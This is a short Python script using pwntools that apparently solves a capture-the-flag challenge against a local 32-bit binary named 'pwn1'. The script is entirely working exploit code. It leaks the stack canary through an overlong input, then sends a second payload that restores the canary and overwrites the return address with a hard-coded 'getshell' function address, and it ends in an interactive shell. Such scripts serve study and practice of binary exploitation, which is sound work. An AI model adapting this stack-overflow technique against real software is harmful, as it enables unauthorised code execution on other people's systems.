from pwn import *
#context(os='linux',arch='amd64')
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

name = './pwn1'
p = process(name)
elf = ELF(name)
if args.G:
    gdb.attach(p)

p.recvuntil("Welcome!\n")

payload = "a"*28 + "b"*4
p.sendline(payload)
p.recvuntil("bbbb")
canary = u32(p.recv(4)) - 0xa
success("canary: " + hex(canary))


getshell_addr = 0x804858b
payload1 = b"a"*32 + p32(canary) + b"b"*12 + p32(getshell_addr)
p.sendline(payload1)

p.interactive()